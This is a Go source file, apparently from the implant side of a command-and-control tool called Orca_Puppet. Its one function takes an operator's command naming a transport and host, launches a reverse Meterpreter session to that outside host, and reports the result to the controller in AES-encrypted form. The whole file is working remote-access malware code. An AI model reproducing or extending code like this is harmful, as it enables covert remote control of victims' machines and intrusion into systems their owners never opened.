package controller

import (
	"Orca_Puppet/cli/cmdopt/reverseopt/meterpreter"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/crypto"
	"encoding/json"
	"fmt"
)

func reverseMeterpreterCmd(sendUserId, decData string) {
	type MeterpreterStruct struct {
		Transport string
		Host      string
	}
	var msf MeterpreterStruct
	json.Unmarshal([]byte(decData), &msf)
	err := meterpreter.Meterpreter(msf.Transport, msf.Host)
	if err != nil {
		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, fmt.Sprintf("reverse meterpreter error: %s", err.Error()))
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "reverseMeterpreter_ret", outputMsg, "")
		return
	}
	data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, fmt.Sprintf("reverse meterpreter[%s://%s] successfully", msf.Transport, msf.Host))
	outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "reverseMeterpreter_ret", outputMsg, "")

}
